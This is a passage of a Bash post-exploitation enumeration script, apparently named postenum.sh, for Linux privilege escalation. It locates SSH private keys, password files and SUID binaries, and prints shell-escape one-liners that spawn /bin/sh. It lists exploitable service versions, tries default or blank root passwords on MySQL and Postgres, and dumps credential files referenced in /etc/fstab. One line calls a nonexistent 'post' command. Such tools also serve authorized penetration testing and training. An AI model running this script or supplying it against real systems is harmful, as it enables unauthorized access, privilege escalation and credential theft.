	echo $cyan"[+] - Check password policy information and Umask value"$white
	LOGINDEFS=$(grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null)
	if [ "$LOGINDEFS" ];
	then
		echo $yellowintensy"[x] Password Policy:"$white
		echo -e "$LOGINDEFS\n"
	else
		:
	fi

	UMASKVALUE=$(umask 2>/dev/null & umask -S 2>/dev/null)
	if [ "$UMASKVALUE" ];
	then
 		echo $yellowintensy"[x] Current umask value:"$white
 		echo "$UMASKVALUE"
  	else
  		:
	fi
	echo ""

	RHOSTUSR=$(find /home -iname "*.rhosts" -exec ls -la {} \; 2>/dev/null)
	if [ "$RHOSTUSR" ];
	then
		echo "[+] - Accessible .rhosts files"
		echo $yellowintensy"[x] Rhost config file(s):"$white 
		echo $redintensy"$RHOSTUSR"$white
	else
		:
	fi
	echo ""
}

function FileSystem(){
	echo $boldgrn"[-] FILE SYSTEM"$white
	echo $cyan"[+] - Check if anything interesting in the www directory"$white
	VAR=$(for x in "/var"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$VAR" ];
	then
		echo $yellowintensy"[x] Any interesting file/folder in /var:"$white
		echo -e "$VAR\n"
	else
		:
	fi

	WWW=$(for x in "/var/www"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ -d /var/www ];
	then
		echo $yellowintensy"[x] Any interesting file/folder in /var/www:"$white
		echo -e "$WWW\n" 
	else
		:
	fi

	HTML=$(for x in "/var/www/html"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ -d /var/www/html ];
	then
		echo $yellowintensy"[x] Any interesting file/folder in /var/www/html:"$white
		echo "$HTML"
	else
		:
	fi
	echo ""

	CONFIGDB=$(find /var/ -iname "config.*" -type f -exec ls -l {} \; 2>/dev/null && find /var/ -iname "db.*" -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$CONFIGDB" ];
	then
		echo $yellowintensy"[x] Search on config.* and db.* files on /var:"$white
		echo "$CONFIGDB"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Search for hidden files"$white
 	HIDDENFILES=$(find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null)
 	if [ "$HIDDENFILES" ];
 	then
 		echo $yellowintensy"[x] Hidden files:"$white
 		echo "$HIDDENFILES"
 	else
 		:
	fi
	echo ""

	PASSWORDFILES=$(find /home -name "pass*" -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$PASSWORDFILES" ];
	then
		echo $cyan"[+] - Check for clear-text password on /home/*"$white
		echo $yellowintensy"[x] Clear text password:"$white
		echo $redintensy"$PASSWORDFILES"$white
	else
		:
	fi
	echo ""

	SYSTEMSSHCHECK=$(find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} \; 2>/dev/null)
	if [ "$SYSTEMSSHCHECK" ];
	then
		echo $cyan"[+] - The most interesting ssh files /"$white
		echo $yellowintensy"[x] SSH files:"$white
		echo $redintensy"$SYSTEMSSHCHECK"$white
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check sticky bits, SUID and SGID"$white
	SUID=$(find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$SUID" ];
	then
		echo $yellowintensy"[x] SUID - 4000:"$white
		echo -e "$SUID\n"
	else
		:
	fi

	SGID=$(find / -perm -g=s -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$SGID" ];
	then
		echo $yellowintensy"[x] SGID - 2000:"$white
		echo -e "$SGID\n"
	else
		:
	fi

	STICKY=$(find / -perm -1000 -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$STICKY" ];
	then
		echo $yellowintensy"[x] Sticky bit for folders - 1000:"$white
		echo -e "$STICKY"
	else
		:
	fi
	echo ""

	CATCHECK=$(command -v cat 2>/dev/null)
	TAILCHECK=$(command -v tail 2>/dev/null)
	HEADCHECK=$(command -v head 2>/dev/null)
	MORECHECK=$(command -v more 2>/dev/null)
	LESSCHECK=$(command -v less 2>/dev/null)
	VIMBASICCHECK=$(command -v vim.basic 2>/dev/null)

	if [ -u "$CATCHECK" ] || [ -u "$TAILCHECK" ] || [ -u "$HEADCHECK" ] || [ -u "$MORECHECK" ] || [ -u "$LESSCHECK" ] || [ -u "$VIMBASICCHECK" ];
	then
		echo $cyan"[+] - Using SUIDs to read/write root files"$white
		if [ -u "$CATCHECK" ];
		then
			ACATCHECK=$(ls -l "$CATCHECK" 2>/dev/null)
			echo $redintensy"$ACATCHECK"$white
		else
			:
		fi

		if [ -u "$TAILCHECK" ];
		then
			ATAILCHECK=$(ls -l "$TAILCHECK" 2>/dev/null)
			echo $redintensy"$ATAILCHECK"$white
		else
			:
		fi

		if [ -u "$HEADCHECK" ];
		then
			AHEADCHECK=$(ls -l "$HEADCHECK")
			echo $redintensy"$AHEADCHECK"$white
		else
			:
		fi

		if [ -u "$MORECHECK" ];
		then
			AMORECHECK=$(ls -l "$MORECHECK" 2>/dev/null)
			echo $redintensy"$AMORECHECK"$white
		else
			:
		fi

		if [ -u "$LESSCHECK" ];
		then
			ALESSCHECK=$(ls -l "$LESSCHECK" 2>/dev/null)
			echo $redintensy"$ALESSCHECK"$white
		else
			:
		fi

		if [ -u "$VIMBASICCHECK" ];
		then
			AVIMBASICCHECK=$(ls -l "$VIMBASICCHECK" 2>/dev/null)
			echo $redintensy"$AVIMBASICCHECK"$white
		else
			:
		fi
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for written and executable places"$white
	WRITABLE=$(find / -perm -222 -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$WRITABLE" ];
	then
		echo $yellowintensy"[x] World-writable folders - 222:"$white
		echo -e "$WRITABLE\n"
	else
		:
	fi

	EXECUTABLE=$(find / -perm -o x -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$EXECUTABLE" ];
	then
		echo $yellowintensy"[x] World-executable folders:"$white
		echo -e "$EXECUTABLE\n"
	else
		:
	fi

	FILEWRITABLE=$(find / -path /proc -prune -o -perm -0002 ! -type l -ls 2>/dev/null)
	if [ "$FILEWRITABLE" ];
	then
		echo $yellowintensy"[x] World-writable files - 0002:"$white
		echo "$FILEWRITABLE"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for readable logfiles owned by root"$white	
	LOGFILES=$(find /var/log -type f -perm -0004 -user root -exec ls -l {} \; 2>/dev/null)
	if [ "$LOGFILES" ];
	then
		echo $yellowintensy"[x] World-readable logfiles - 0004:"$white
		echo $redintensy"$LOGFILES"$white
	else
		:
	fi
	echo ""

	NSFEXPORTS=$(ls -la /etc/exports 2>/dev/null)
	if [ "$NSFEXPORTS" ];
	then
		echo $cyan"[+] - List NFS shares and permisisons"$white
  		echo $yellowintensy"[x] NFS:"$white
  		echo $redintensy"$NSFEXPORTS"$white
  	else
  		:
	fi
	echo ""
}

function DevToolsAndLang(){
	echo $boldgrn"[-] DEVELOPMENT TOOLS and LANGUAGES"$white
	echo $cyan"[+] - Check for development tools and languages are installed/supported"$white
	PYTHON=$(command -v python 2>/dev/null)
	if [ "$PYTHON" ];
	then
		echo "$PYTHON"
	else
		:
	fi

	PYTHON3=$(command -v python3 2>/dev/null)
	if [ "$PYTHON3" ];
	then
		echo "$PYTHON3"
	else
		:
	fi

	PERL=$(command -v perl 2>/dev/null)
	if [ "$PERL" ];
	then
		echo "$PERL"
	else
		:
	fi

	PHP=$(command -v php 2>/dev/null)
	if [ "$PHP" ];
	then
		echo "$PHP"
	else
		:
	fi

	GCC=$(command -v gcc 2>/dev/null)
	if [ "$GCC" ];
	then
		echo "$GCC"
	else
		:
	fi

	CC=$(command -v cc 2>/dev/null)
	if [ "$CC" ];
	then
		echo "$CC"
	else
		:
	fi

	NMAP=$(command -v nmap 2>/dev/null)
	if [ "$NMAP" ];
	then
		echo "$NMAP"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for how files can be uploaded"$white
	FTP=$(command -v ftp 2>/dev/null)
	if [ "$FTP" ];
	then
		echo "$FTP"
	else
		:
	fi

	TFTP=$(command -v tftp 2>/dev/null)
	if [ "$TFTP" ];
	then
		echo "$TFTP"
	else
		:
	fi

	NETCAT=$(command -v netcat 2>/dev/null)
	if [ "$NETCAT" ];
	then
		echo "$NETCAT"
	else
		:
	fi

	NC=$(command -v nc 2>/dev/null)
	if [ "$NC" ];
	then
		echo "$NC"
	else
		:
	fi

	WGET=$(command -v wget 2>/dev/null)
	if [ "$WGET" ];
	then
		echo "$WGET"
	else
		:
	fi

	CURL=$(command -v curl 2>/dev/null)
	if [ "$CURL" ];
	then
		echo "$CURL"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Shell escape"$white
	echo "awk    =	awk 'BEGIN {system(\"/bin/sh\")}'"
	echo "perl   =	perl -e 'exec \"/bin/sh\";'"
	echo "python = 	python -c 'import pty;pty.spawn(\"/bin/sh\")'"
	echo "php    =	php -r 'system(\"/bin/sh\");'"
	echo "ruby   =	ruby -e 'exec \"/bin/sh\"'"
	echo "less   =	!sh"
	echo "more   =	!sh"
	echo "man    =	!sh"
	echo "nmap   =	--interactive"
	echo "nmap   =	echo \"os.execute('/bin/sh')\" > /tmp/shell.nse"
	echo "find   =	find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
	echo "find   =	find / -exec sh -i \;"
	echo "vi     =	:!sh or :shell or -c '!sh'"
	echo "vim    =	:!sh or :shell or -c '!sh'"
	echo "gdb	 =	shell"
	echo ""

	echo $cyan"[+] - List all Environment Variables"$white
	PRINTENV=$(printenv 2>/dev/null)
	if [ "$PRINTENV" ];
	then
		echo "$PRINTENV"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - List all available shells"$white
	SHELLS=$(cat /etc/shells 2>/dev/null)
	if [ "$SHELLS" ];
	then
		echo "$SHELLS"
	else
		:
	fi
	echo ""
}


function SoftwareVersion(){
	echo $boldgrn"[-] SOFTWARES VERSION"$white
	echo $cyan"[+] - Check apps and services version"$white
	SUDOVER=$(command -v sudo)
	if [ "$SUDOVER" ];
	then
		echo $yellowintensy"[x] Sudo version (<= 1.8.20):"$white
		sudo -V | grep -i "version" | grep "Sudo " 2>/dev/null
	else
		:
	fi
	echo ""

	MYSQLVER=$(command -v mysql)
	if [ "$MYSQLVER" ];
	then
		echo $yellowintensy"[x] MYSQL version:"$white
		mysql -V 2>/dev/null
	else
		:
	fi
	echo ""

	PSQL=$(command -v psql)
	if [ "$PSQL" ];
	then
		echo $yellowintensy"[x] PostgreSQL version:"$white
		psql -V 2>/dev/null
	else
		:
	fi
	echo ""

	APACHEVER=$(command -v apache2)
	if [ "$APACHEVER" ];
	then
		echo $yellowintensy"[x] Apache version:"$white
		apache2 -v 2>/dev/null
	else
		:
	fi
	echo ""

	APACHEUSER=$(command -v apache2)
	if [ "$APACHEUSER" ];
	then
		echo $yellowintensy"[x] Account running under apache service:"$white
		grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null | awk '{sub(/.*\export /,"")}1'
	else
		:
	fi
	echo ""

	CHKROOTKIT=$(command -v chkrootkit 2>/dev/null)
	if [ "$CHKROOTKIT" ];
	then
		echo $yellowintensy"[x] Chkrootkit version (< 0.50):"$white
		chkrootkit -V
	else
		:
	fi
	echo ""

	PKEXEC=$(command -v pkexec 2>/dev/null)
	if [ "$PKEXEC" ];
	then
		echo $yellowintensy"[x] Pkexec version:"$white
		pkexec --version
	else
		:
	fi
	echo""

	JAVA=$(command -v java 2>/dev/null)
	if [ "$JAVA" ];
	then
		echo $yellowintensy"[x] Java version:"$white
		java -version
	else
		:
	fi
	echo ""

	EXIM=$(exim -bV 2>/dev/null)
	if [ "$EXIM" ];
	then
		echo $yellowintensy"[x] Exim version (<= 4.91):"$white
		echo "$EXIM"
	else
		:
	fi
	echo ""

	UDEV=$(udevadm --version 2>/dev/null)
	if [ "$UDEV" ];
	then
		echo $yellowintensy"[x] Udev version (< 232):"$white
		echo "Udev version: $UDEV"
	else
		:
	fi
	echo ""
}

function TryingAccess(){
	echo $boldgrn"[-] TRYING ACCESS"$white
	echo $cyan"[+] - Check for some methods for extract creds and get access as root"$white
	MYSQLCONNECT=$(mysqladmin -uroot -proot version 2>/dev/null)
	if [ "$MYSQLCONNECT" ];
	then
		echo $yellowintensy"[x] Connect to MYSQL with root/root creds:"$white
		echo $redintensy"[/] We can connect to the local MYSQL service with default root/root credentials!"$white
		echo -e "$MYSQLCONNECT\n"
	else 
	  	:
	fi

	MYSQLCONNECTNOPASS=$(mysqladmin -uroot version 2>/dev/null)
	if [ "$MYSQLCONNECTNOPASS" ];
	then
		echo $yellowintensy"[x] Connect to MYSQL as root and non-pass:"$white
	  	echo $redintensy"[/] We can connect to the local MYSQL service as 'root' and without a password!"$white
	  	echo -e "$MYSQLCONNECTNOPASS\n" 
	else 
	  	:
	fi

	POSTCON1=$(psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON1" ];
	then
		echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user postgres and non-pass:"$white
		 echo $redintensy"[/] We can connect to Postgres DB 'template0' as user 'postgres' with no password!"$white
		 echo -e "$POSTCON1\n"
	else 
	  	:
	fi

	POSTCON11=$(psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON11" ];
	then
		echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user postgres and non-pass:"$white
		echo $redintensy"[/] We can connect to Postgres DB 'template1' as user 'postgres' with no password!"$white
		echo -e "$POSTCON11\n"
	else 
	  	:
	fi

	POSTCON2=$(psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON2" ];
	then
		echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user psql and non-pass:"$white
		echo $redintensy"[/] We can connect to Postgres DB 'template0' as user 'psql' with no password!"$white
		echo -e "$POSTCON2\n"
	else 
	  	:
	fi

	POSTCON22=$(psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON22" ];
	then
		echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user psql and non-pass:"$white
		echo $redintensy"[/] We can connect to Postgres DB 'template1' as user 'psql' with no password!"$white
		post -e "$POSTCON22\n"
	else 
	  	:
	fi

	FSTAB=$(grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null)
	if [ "$FSTAB" ];
	then
		echo $yellowintensy"[x] Any creds in /etc/fstab:"$white
		echo $redintensy"[/] Looks like there are credentials in /etc/fstab!"$white
		echo -e "$FSTAB\n"
	else 
	  	:
	fi

	FSTABCRED=$(grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null)
	if [ "$FSTABCRED" ];
	then
		echo $yellowintensy"[x] Any creds file in /etc/fstab:"$white
		echo $redintensy"[/] /etc/fstab contains a credentials file!"$white
		echo "$FSTABCRED"
	else
		:
	fi
	echo ""
}

function Usage(){
	echo $boldgrn" Usage   > ./postenum.sh <option>"$white
	echo " Options >"
	echo "	-a :	All"
	echo "	-s :	Filesystem [SUID, SGID, Config/DB files, etc.]"
	echo "	-l :	Shell escape and development tools"
	echo "	-c :	The most interesting files"
	echo "	-n :	Network settings"
	echo "	-p :	Services and cron jobs"
	echo "	-o :	OS informations and priv esc exploits"
	echo "	-v :	Sofware's versions"
	echo "	-t :	Fstab credentials and databases checker"
	echo ""
}

OPTIONS="$1"
function Postenum(){
	if [ "$OPTIONS" == "" ];
	then
		Usage
	else
		if [ "$OPTIONS" == "-a" ];
		then
			OperatingSystem
			AppsAndServices
			CommAndNet
			SoftwareVersion
			ConfidentialInfoAndUser
			FileSystem
			DevToolsAndLang
			TryingAccess
		else
			if [ "$OPTIONS" == "-s" ];
			then
				FileSystem
			else
				if [ "$OPTIONS" == "-l" ];
				then
					DevToolsAndLang
				else
					if [ "$OPTIONS" == "-c" ];
					then
						ConfidentialInfoAndUser
					else
						if [ "$OPTIONS" == "-n" ];
						then
							CommAndNet
						else
							if [ "$OPTIONS" == "-p" ];
							then
								AppsAndServices
							else
								if [ "$OPTIONS" == "-o" ];
								then
									OperatingSystem
								else
									if [ "$OPTIONS" == "-v" ];
									then
										SoftwareVersion
									else
										if [ "$OPTIONS" == "-t" ];
										then
											TryingAccess
										else
											Usage
										fi
									fi
								fi
							fi
						fi
					fi
				fi
			fi	
		fi
	fi
}
Postenum
